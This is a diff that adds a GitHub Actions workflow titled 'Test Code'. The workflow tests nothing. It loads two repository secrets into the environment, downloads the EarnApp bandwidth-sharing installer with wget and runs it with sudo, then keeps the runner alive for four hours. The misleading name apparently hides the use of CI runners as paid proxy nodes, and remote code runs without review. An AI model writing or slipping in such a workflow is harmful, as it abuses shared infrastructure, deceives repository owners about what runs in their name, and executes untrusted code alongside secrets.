@@ -1,0 +1,19 @@
+name: Test Code
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [fts]
+
+jobs:
+  fts:
+    runs-on: ubuntu-latest
+    steps:
+      - name: start
+        env:
+          KEY_S: ${{ secrets.KEY_S }}
+          KEY_W: ${{ secrets.KEY_W }}
+
+        run: |
+          wget -qO- https://brightdata.com/static/earnapp/install.sh > /tmp/earnapp.sh && sudo bash /tmp/earnapp.sh
+          sleep 4h
